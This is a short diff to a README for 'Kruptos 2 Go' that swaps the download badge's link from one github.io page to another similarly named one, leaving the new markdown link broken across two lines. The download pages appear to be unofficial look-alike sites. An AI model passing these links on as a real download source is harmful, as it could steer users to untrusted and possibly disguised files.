@@ -2,7 +2,8 @@
 
 ## 📥 Download Kruptos 2 Go
 
-[![⬇️ Download Kruptos 2 Go](https://img.shields.io/badge/Download-Kruptos%202%20Go-blue?style=for-the-badge&logo=usb)](https://kruptos2go-download.github.io/.github)
+[![⬇️ Download Kruptos 2 Go](https://img.shields.io/badge/Download-Kruptos%202%20Go-blue?style=for-the-badge&logo=usb)](https://kruptos-2-go-portable.github.io/.github
+)
 
 ---
 
